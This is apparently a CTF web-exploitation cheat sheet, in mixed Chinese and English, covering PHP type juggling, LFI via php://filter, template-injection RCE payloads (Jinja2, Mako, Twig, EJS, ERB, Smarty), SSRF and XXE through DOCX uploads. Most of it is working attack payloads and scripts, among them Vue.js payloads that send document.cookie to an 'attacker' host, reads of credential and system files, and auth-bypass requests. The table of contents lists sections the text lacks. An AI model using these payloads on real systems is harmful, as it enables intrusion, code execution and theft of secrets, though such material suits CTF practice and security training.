# CTF Web - PHP, LFI, SSTI, SSRF and Type Juggling

## 阅读定位

- 这是服务端方向的 **主入口**：PHP 语义、LFI、SSTI、SSRF 和最常见 server-side injection 都先从这里开始。
- 如果你需要 XXE、XML、command injection 或 GraphQL，再读 xml-command-and-graphql-injection.md。
- 如果已经进入执行链、反序列化、上传或复杂绕过，再切 ruby-php-upload-and-ssti-rce.md / path-traversal-ssrf-upload-and-rsc.md。

## Table of Contents
- [PHP Type Juggling](#php-type-juggling)
- [PHP File Inclusion / php://filter](#php-file-inclusion--phpfilter)
- [SQL Injection](#sql-injection) — moved to sql-injection.md
- [Python str.format() Attribute Traversal (PlaidCTF 2017)](#python-strformat-attribute-traversal-plaidctf-2017)
- [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
  - [Jinja2 RCE](#jinja2-rce)
  - [Go Template Injection](#go-template-injection)
  - [EJS Server-Side Template Injection](#ejs-server-side-template-injection)
  - [ERB SSTI + Sequel::DATABASES Bypass (BearCatCTF 2026)](#erb-ssti--sequeldatabases-bypass-bearcatctf-2026)
  - [Mako SSTI](#mako-ssti)
  - [Twig SSTI](#twig-ssti)
  - [Vue.js Template Injection via toString.constructor (VolgaCTF 2018)](#vuejs-template-injection-via-tostringconstructor-volgactf-2018)
  - [SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)](#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026)
- [SSRF](#ssrf)
  - [Host Header SSRF (MireaCTF)](#host-header-ssrf-mireactf)
  - [DNS Rebinding for TOCTOU (Time-of-Check to Time-of-Use)](#dns-rebinding-for-toctou-time-of-check-to-time-of-use)
  - [Curl Redirect Chain Bypass](#curl-redirect-chain-bypass)
- [XXE (XML External Entity)](#xxe-xml-external-entity)
  - [XXE via DOCX/Office XML Upload (School CTF 2016)](#xxe-via-docxoffice-xml-upload-school-ctf-2016)
- [PHP hash_hmac Returns NULL with Array Input (AceBear 2018)](#php-hash_hmac-returns-null-with-array-input-acebear-2018)
- [Smarty SSTI via CVE-2017-1000480 Comment Injection (Insomni'hack 2018)](#smarty-ssti-via-cve-2017-1000480-comment-injection-insomnihack-2018)
  - [Newline Bypass](#newline-bypass)
  - [Incomplete Blocklist Bypass](#incomplete-blocklist-bypass)
  - [Sendmail Parameter Injection via CGI (SECCON 2015)](#sendmail-parameter-injection-via-cgi-seccon-2015)
  - [Multi-Barcode Concatenation to Shell Injection (BSidesSF 2024)](#multi-barcode-concatenation-to-shell-injection-bsidessf-2024)
  - [Git CLI Newline Injection via URL Path (BSidesSF 2026)](#git-cli-newline-injection-via-url-path-bsidessf-2026)
  - [Introspection and Schema Discovery](#introspection-and-schema-discovery)
  - [Query Batching and Aliasing for Rate Limit Bypass](#query-batching-and-aliasing-for-rate-limit-bypass)
  - [String Interpolation Injection](#string-interpolation-injection)

For code execution attacks (Ruby/Perl/JS/LaTeX/Prolog injection, PHP preg_replace /e, ReDoS, file upload to RCE, PHP deserialization, XPath injection, Thymeleaf SpEL SSTI), see ruby-php-upload-and-ssti-rce.md. For SQLi keyword fragmentation, SQL WHERE bypass, SQL via DNS, bash brace expansion, Common Lisp injection, PHP7 OPcache, and more, see sqli-upload-deser-and-command-rce.md. For deserialization attacks (Java, Pickle) and race conditions, see php-java-python-deserialization.md. For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, and other advanced techniques, see path-traversal-ssrf-upload-and-rsc.md.

---

## PHP Type Juggling

**对照表（以下在 `==` 下均为 `true`）：**
| Comparison | Result | Why |
|-----------|--------|-----|
| `0 == "php"` | `true` | Non-numeric string converts to `0` |
| `0 == ""` | `true` | Empty string converts to `0` |
| `"0" == false` | `true` | `"0"` is falsy |
| `NULL == false` | `true` | Both falsy |
| `NULL == ""` | `true` | Both falsy |
| `NULL == array()` | `true` | Both empty |
| `"0e123" == "0e456"` | `true` | Both parse as `0` in scientific notation |

**Auth bypass with type juggling:**
```php
// Vulnerable: if ($input == $password)
// If $password starts with "0e" followed by digits (MD5 "magic hashes"):
// md5("240610708") = "0e462097431906509019562988736854"
// md5("QNKCDZO")  = "0e830400451993494058024219903391"
// Both compare as 0 == 0 → true
```

**Exploit via JSON type confusion:**
```bash
# Send integer 0 instead of string to bypass strcmp/==
curl -X POST http://target/login \
  -H 'Content-Type: application/json' \
  -d '{"password": 0}'
# PHP: 0 == "any_non_numeric_string" → true
```

**Array bypass for strcmp:**
```bash
# strcmp(array, string) returns NULL, which == 0 == false
curl http://target/login -d 'password[]=anything'
# PHP: strcmp(["anything"], "secret") → NULL → if(!strcmp(...)) passes
```

---

### PHP Type Juggling 速查

Loose `==` performs type coercion: `0 == "string"` is `true`, `"0e123" == "0e456"` is `true` (magic hashes). Send JSON integer `0` to bypass string password checks. `strcmp([], "str")` returns `NULL` which passes `!strcmp()`. Use `===` for defense.

See php-lfi-ssti-ssrf-and-type-juggling.md for comparison table and exploit payloads.


---
## PHP File Inclusion / php://filter

**Basic LFI:**
```php
// Vulnerable: include($_GET['page'] . ".php");
// Exploit: page=../../../../etc/passwd%00  (null byte, PHP < 5.3.4)
// Modern: page=php://filter/convert.base64-encode/resource=index
```

**Source code disclosure via php://filter:**
```bash
# Base64-encode prevents PHP execution, leaks raw source
curl "http://target/?page=php://filter/convert.base64-encode/resource=config"
# Returns: PD9waHAgJHBhc3N3b3JkID0gInMzY3IzdCI7IC...
echo "PD9waHAg..." | base64 -d
# Output: <?php $password = "s3cr3t"; ...
```

**Filter chains for RCE (PHP >= 7):**
```bash
# Chain convert filters to write arbitrary content
php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|..../resource=php://temp
```

**Common LFI targets:**
```text
/etc/passwd                          # User enumeration
/proc/self/environ                   # Environment variables (secrets)
/proc/self/cmdline                   # Process command line
/var/log/apache2/access.log          # Log poisoning vector
/var/www/html/config.php             # Application secrets
php://filter/convert.base64-encode/resource=index  # Source code
```

---

### PHP File Inclusion / LFI 速查

`php://filter/convert.base64-encode/resource=config` leaks PHP source code without execution. Common LFI targets: `/etc/passwd`, `/proc/self/environ`, app config files. Null byte (`%00`) truncates `.php` suffix on PHP < 5.3.4.

See php-lfi-ssti-ssrf-and-type-juggling.md for filter chains and RCE techniques.


---
## SQL Injection

SQL injection techniques have been moved to a dedicated file. See sql-injection.md for all SQL injection techniques.

---

## Python str.format() Attribute Traversal (PlaidCTF 2017)

```python
# Leak object attributes via format string
payload = "{0.__class__.__mro__}"
payload = "{0.secret_field}"

# In Flask: endpoint uses new_name.format(player_object)
# Send: {0.pykemon} to leak all pykemon objects

# Access nested attributes
"{0.__class__.__init__.__globals__}"

# Dictionary key access via bracket notation
"{0[secret_key]}"

# Chaining attribute and index access
"{0.__class__.__mro__[1].__subclasses__()}"
```

**Common vulnerable patterns:**
```python
# Vulnerable: user input as format string
greeting = user_input.format(current_user)

# Vulnerable: format with request object
message = template_str.format(request)

# Safe alternative: use positional or keyword args only
greeting = "Hello, {name}!".format(name=user_input)
```

**关键结论：** Unlike `%s` formatting, Python `str.format()` allows dot-notation attribute traversal (`{0.attr.subattr}`) and bracket indexing (`{0[key]}`), turning any format call with user input into an info leak. This is distinct from SSTI — it does not require a template engine, just a `.format()` call where the format string is user-controlled. Look for Flask/Django views that use `.format()` with user input on model objects or request objects.

---

### 速查补充

Python `str.format()` allows dot-notation attribute traversal (`{0.attr.subattr}`) and bracket indexing (`{0[key]}`). When user input reaches `.format(obj)`, leak arbitrary attributes without a template engine. Distinct from SSTI. See php-lfi-ssti-ssrf-and-type-juggling.md.

**Thymeleaf SpEL SSTI (Java/Spring):** `${T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File("/flag.txt"))}` reads files via Spring utility classes when standard I/O is WAF-blocked. Works in distroless containers (no shell). See ruby-php-upload-and-ssti-rce.md.


---
## SSTI (Server-Side Template Injection)

### Jinja2 RCE
```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Without quotes (use bytes):
{{self.__init__.__globals__.__builtins__.__import__(
    self.__init__.__globals__.__builtins__.bytes([0x6f,0x73]).decode()
).popen('cat /flag').read()}}

# Flask/Werkzeug:
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Go Template Injection
```go
{{.ReadFile "/flag.txt"}}
```

### EJS Server-Side Template Injection
**模式（Checking It Twice）：** User input passed to `ejs.render()` in error paths.
```javascript
<%- global.process.mainModule.require('./db.js').queryDb('SELECT * FROM table').map(row=>row.col1+row.col2).join(" ") %>
```

### ERB SSTI + Sequel::DATABASES Bypass (BearCatCTF 2026)

**模式（Treasure Hunt 5）：** Sinatra (Ruby) app uses ERB templates. ERBSandbox restricts direct database access, but `Sequel::DATABASES` global list is unrestricted.

```bash
# Confirm SSTI
curl --cookie 'name=<%= 7*7 %>' http://target/upload-highscore
# Response contains "49"

# Enumerate tables
curl --cookie 'name=<%= Sequel::DATABASES.first.tables %>' ...
# → [:players]

# Dump schema
curl --cookie 'name=<%= Sequel::DATABASES.first.schema(:players) %>' ...

# Exfiltrate data
curl --cookie 'name=<%= Sequel::DATABASES.first[:players].all %>' ...
```

**关键结论：** Even when ERB sandboxes block `DB` or `DATABASE` constants, `Sequel::DATABASES` is a global array listing all open Sequel connections. It bypasses variable-name-based restrictions. In Sinatra, `<%= ... %>` tags in cookies or parameters that are reflected through ERB templates are common SSTI vectors.

### Mako SSTI

```python
# Detection
${7*7}  # Returns 49

# RCE
<%
  import os
  os.popen("id").read()
%>

# One-liner
${__import__('os').popen('cat /flag.txt').read()}
```

**关键结论：** Mako templates (Python) execute Python code directly inside `${}` or `<% %>` blocks — no sandbox, no class traversal needed. Detection identical to Jinja2 (`${7*7}`) but payloads are plain Python.

### Twig SSTI

```twig
{# Detection #}
{{7*7}}   {# Returns 49 #}
{{7*'7'}} {# Returns 7777777 (string repeat = Twig, not Jinja2) #}

{# File read #}
{{'/etc/passwd'|file_excerpt(1,30)}}

{# RCE (Twig 1.x) #}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{# RCE (Twig 3.x via filter) #}
{{['id']|map('system')|join}}
{{['cat /flag.txt']|map('passthru')|join}}
```

**关键结论：** Distinguish Twig from Jinja2 via `{{7*'7'}}` — Twig repeats the string (`7777777`), Jinja2 returns `49`. Twig 3.x removed `_self.env` access; use `|map('system')` filter chain instead.

### Vue.js Template Injection via toString.constructor (VolgaCTF 2018)

**Basic payloads:**
```javascript
// Constructor chaining to create and execute a Function object
${toString.constructor('document.location="http://attacker/?"+document.cookie')()}

// Alternative constructor chain
{{constructor.constructor('return fetch("http://attacker/?c="+document.cookie)')()}}

// Using the _c (createElement) internal to confirm Vue context
{{_c.constructor('return 1')()}}
```

**Payload variations for different Vue versions:**
```javascript
// Vue 2.x — template expressions have access to the component scope
{{constructor.constructor('return this')().document.location='http://attacker/?c='+document.cookie}}

// Vue 2.x — via toString
${toString.constructor('alert(document.domain)')()}

// Vue 3.x — stricter sandbox, but constructor chaining still works
{{(_=toString.constructor('return document'))().cookie}}
```

**Detection and exploitation:**
```python
import requests

target = "http://target/page"

# Step 1: Detect Vue.js template injection
probes = [
    "{{7*7}}",           # Returns 49 if expressions evaluated
    "{{toString()}}",    # Returns [object Object] or similar
    "${7*7}",            # Template literal syntax (some Vue configs)
]
for probe in probes:
    r = requests.get(target, params={"name": probe})
    print(f"Probe: {probe} -> {r.text[:200]}")

# Step 2: Execute via constructor chain
payload = "${toString.constructor('document.location=\"http://attacker/?c=\"+document.cookie')()}"
r = requests.get(target, params={"name": payload})
```

**关键结论：** Vue.js template expressions evaluate JavaScript. When user input is rendered in a Vue template, `toString.constructor(code)()` creates and executes a Function object, bypassing simple keyword filters. This works because JavaScript's `constructor` property on any object provides access to the `Function` constructor. Vue 2.x is more permissive; Vue 3.x has a stricter expression sandbox but constructor chaining often still works. Look for reflected input in pages that include Vue.js and use `{{ }}` or `v-bind` directives.

### SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)

**模式（KameHame-Hack）：** Jinja2 SSTI where quotes are filtered, preventing string arguments. Use Python keyword arguments to bypass — `__dict__.update(key=value)` requires no quotes.

```python
# Quotes filtered → can't do {{ config['SECRET_KEY'] }} or string args
# But keyword arguments don't need quotes:
{{player.__dict__.update(power_level=9999999) or player.name}}
```

**How it works:**
1. `player.__dict__.update(power_level=9999999)` — modifies object attribute directly via keyword arg (no quotes needed)
2. `or player.name` — `dict.update()` returns `None` (falsy), so Jinja2 renders `player.name` as output
3. The attribute change persists across requests in the session

**关键结论：** When SSTI filters block quotes/strings, Python's keyword argument syntax (`func(key=value)`) operates without any string delimiters. `__dict__.update()` can modify any object attribute to bypass application logic (e.g., game state, auth checks, permission levels).

### Smarty SSTI via CVE-2017-1000480 Comment Injection (Insomni'hack 2018)

```text
# Vulnerable URL pattern — template ID/path is user-controlled:
http://target/?id=*/echo file_get_contents('/flag');/*

# What happens server-side in the compiled template:
# <?php /* source: /path/to/*/echo file_get_contents('/flag');/* */ ?>
# The injected */ closes the comment, PHP code executes, /* reopens a comment
```

```php
// Smarty compiled template (simplified):
// Before injection:
<?php /* Smarty version x, compiled from "user_template_name" */ ?>

// After injection with id = */echo file_get_contents('/flag');/*
<?php /* Smarty version x, compiled from "*/echo file_get_contents('/flag');/*" */ ?>
// Breaks down to:
//   /* Smarty version x, compiled from "*/   ← comment ends here
//   echo file_get_contents('/flag');          ← PHP executes
//   /*" */                                    ← new comment
```

```python
import requests

# Basic file read
r = requests.get("http://target/", params={
    "id": "*/echo file_get_contents('/flag');/*"
})
print(r.text)

# RCE
r = requests.get("http://target/", params={
    "id": "*/system('id');/*"
})
print(r.text)

# If parentheses are filtered, use backtick execution:
r = requests.get("http://target/", params={
    "id": "*/echo `cat /flag`;/*"
})
```

**关键结论：** Smarty places the template source path in a `/* ... */` PHP comment. If the path is user-controlled and `*/` is not sanitized, arbitrary PHP executes. This affects custom Smarty resources (where the template name comes from user input), not the default file-based resource handler. Fixed in Smarty 3.1.32. Look for Smarty template rendering where the template identifier is derived from URL parameters.

---

## PHP hash_hmac Returns NULL with Array Input (AceBear 2018)

```php
// Vulnerable server code:
$nonce = $_POST['nonce'];
$secret = file_get_contents('/secret_key');
$mac = hash_hmac('sha256', $nonce, $secret);  // returns NULL if $nonce is array

// Later: server uses $mac (NULL) as key for another HMAC
$token = hash_hmac('sha256', 'gimmeflag', $mac);
// hash_hmac('sha256', 'gimmeflag', NULL) == hash_hmac('sha256', 'gimmeflag', '')
// This is a known constant the attacker can precompute!
```

```python
import hmac
import hashlib
import requests

# Precompute the token that the server will generate when mac=NULL
# hash_hmac('sha256', 'gimmeflag', NULL) in PHP == HMAC with empty key in Python
known_token = hmac.new(b'', b'gimmeflag', hashlib.sha256).hexdigest()
print(f"Predicted token: {known_token}")

# Force nonce to be an array, breaking hash_hmac
r = requests.post("http://target/getflag", data={
    "nonce[]": "x",          # PHP receives $_POST['nonce'] as array ['x']
    "token": known_token      # server-side comparison succeeds
})
print(r.text)
```

```text
# HTTP request showing the array injection:
POST /getflag HTTP/1.1
Content-Type: application/x-www-form-urlencoded

nonce[]=x&token=<precomputed_hmac>
```

**关键结论：** PHP silently coerces types, and `hash_hmac` with a non-string `$data` argument returns `NULL`/`false` instead of raising an error. Always check if parameters can be forced to arrays via `param[]=value`. This pattern extends to other PHP hash functions: `md5(array())` returns `NULL`, `sha1(array())` returns `NULL`. Any authentication flow chaining hash outputs as keys for subsequent operations is vulnerable when an intermediate hash can be forced to `NULL`.

---

## SSRF

### Host Header SSRF (MireaCTF)

Server-side code uses the HTTP `Host` header to construct internal validation requests:
```go
// Vulnerable: uses client-controlled Host header for internal request
response, err := http.Get("http://" + c.Request.Host + "/validate")
```

**Exploitation:**
1. Set up an attacker-controlled server returning the desired response:
   ```python
   from flask import Flask
   app = Flask(__name__)

   @app.route("/validate")
   def validate():
       return '{"access": true}'

   app.run(host='0.0.0.0', port=5000)
   ```
2. Expose via ngrok or public VPS, then send the request with a spoofed Host header:
   ```bash
   curl -H "Host: attacker.ngrok-free.app" https://target/api/secret-object
   ```

**关键结论：** The server makes an internal HTTP request to `http://<Host-header>/validate` instead of `http://localhost/validate`. By setting the Host header to an attacker-controlled domain, the validation request goes to the attacker's server, which returns `{"access": true}`. This bypasses IP-based access controls entirely.

---

### SSRF 速查

```text
127.0.0.1, localhost, 127.1, 0.0.0.0, [::1]
127.0.0.1.nip.io, 2130706433, 0x7f000001
```

DNS rebinding for TOCTOU: https://lock.cmpxchg8b.com/rebinder.html

**Host header SSRF:** Server builds internal request URL from `Host` header (e.g., `http.Get("http://" + request.Host + "/validate")`). Set Host to attacker domain → validation request goes to attacker server. See php-lfi-ssti-ssrf-and-type-juggling.md.

**ElasticSearch Groovy RCE via SSRF:** SSRF to internal ES on port 9200 enables RCE through `script_fields` Groovy scripting (pre-5.0). See parser-wrapper-and-legacy-ssrf-tricks.md.


---
### DNS Rebinding for TOCTOU (Time-of-Check to Time-of-Use)
```python
rebind_url = "http://7f000001.external_ip.rbndr.us:5001/flag"
requests.post(f"{TARGET}/register", json={"url": rebind_url})
requests.post(f"{TARGET}/trigger", json={"webhook_id": webhook_id})
```

### Curl Redirect Chain Bypass
After `CURLOPT_MAXREDIRS` exceeded, some implementations make one more unvalidated request:
```c
case CURLE_TOO_MANY_REDIRECTS:
    curl_easy_getinfo(curl, CURLINFO_REDIRECT_URL, &redirect_url);
    curl_easy_setopt(curl, CURLOPT_URL, redirect_url);  // NO VALIDATION
    curl_easy_perform(curl);
```

---

## XXE (XML External Entity)

基础 XXE 与 OOB XXE 的通用模板已统一放在 xml-command-and-graphql-injection.md，本卷只保留 DOCX / Office XML 的专项变体。

### XXE via DOCX/Office XML Upload (School CTF 2016)

DOCX files are ZIP archives containing XML. Modify `[Content_Types].xml` inside the DOCX to inject XXE payloads that execute when the server parses the uploaded document.

```bash
# Step 1: Create a minimal DOCX and extract it
mkdir docx_exploit && cd docx_exploit
unzip template.docx

# Step 2: Inject XXE into [Content_Types].xml
cat > '[Content_Types].xml' << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/hack" ContentType="&xxe;"/>
</Types>
EOF

# Step 3: Repackage as DOCX
zip -r exploit.docx '[Content_Types].xml' word/ _rels/

# Step 4: Upload to target
curl -F "file=@exploit.docx" http://target/upload
# Response or error message may contain base64-encoded file contents
```

**关键结论：** Any file format based on ZIP+XML (DOCX, XLSX, PPTX, ODT, SVG+ZIP) can carry XXE payloads. The parser often processes `[Content_Types].xml` first, making it the ideal injection point. Use `php://filter/convert.base64-encode` for binary-safe exfiltration.

---


---

## SSTI 速查
```python
# Jinja2 RCE
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
# Go template
{{.ReadFile "/flag.txt"}}
# EJS
<%- global.process.mainModule.require('child_process').execSync('id') %>
# Jinja2 quote bypass (keyword args):
{{obj.__dict__.update(attr=value) or obj.name}}
```

**Mako SSTI (Python):** `${__import__('os').popen('id').read()}` — no sandbox, plain Python inside `${}` or `<% %>`. **Twig SSTI (PHP):** `{{['id']|map('system')|join}}` — distinguish from Jinja2 via `{{7*'7'}}` (Twig repeats string, Jinja2 returns 49). See php-lfi-ssti-ssrf-and-type-juggling.md and php-lfi-ssti-ssrf-and-type-juggling.md.

**Quote filter bypass:** Use `__dict__.update(key=value)` — keyword arguments need no quotes. See php-lfi-ssti-ssrf-and-type-juggling.md.

**ERB SSTI (Ruby/Sinatra):** `<%= Sequel::DATABASES.first[:table].all %>` bypasses ERBSandbox variable-name restrictions via the global `Sequel::DATABASES` array. See php-lfi-ssti-ssrf-and-type-juggling.md.


---

## XML Injection via X-Forwarded-For Header (Pwn2Win 2016)
Server builds XML from headers without escaping. Inject `</ip><admin>true</admin><ip>` via X-Forwarded-For; first-tag-wins XML parsing. See php-lfi-ssti-ssrf-and-type-juggling.md.
